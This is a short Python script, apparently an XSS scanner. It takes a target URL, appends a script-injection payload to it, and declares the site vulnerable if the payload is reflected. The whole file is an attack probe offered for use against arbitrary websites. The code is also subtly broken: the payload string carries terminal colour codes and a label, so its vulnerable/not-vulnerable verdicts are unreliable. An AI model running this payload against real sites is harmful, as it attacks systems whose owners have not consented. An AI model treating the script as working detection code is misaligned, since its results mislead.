import requests
from termcolor import colored
import sys


print("")
target = input("[*] Enter Target URL: ")

print(" ")

response = requests.get(target)

#sta = response.status_code
#print (response.headers)

if response.status_code == 200:

    a = colored("[*] URL is Valid!! ","red")

    print (a)

    print(" ")

    b = payload = colored("XSS Payload : \"><script>alert(\"Hacked\")</script>", "green")

    print(b)

    print(" ")

    req = requests.get(target + payload)

    check = req.text

    if payload in check:

        print ("[*] Website is Vulnerable to XSS..:)")

        print("[*] Vulnerability Found This URL :", target)



    else:
        print ("[*] WebSite is Not Vulnerable To XSS Vulnrability!!!")
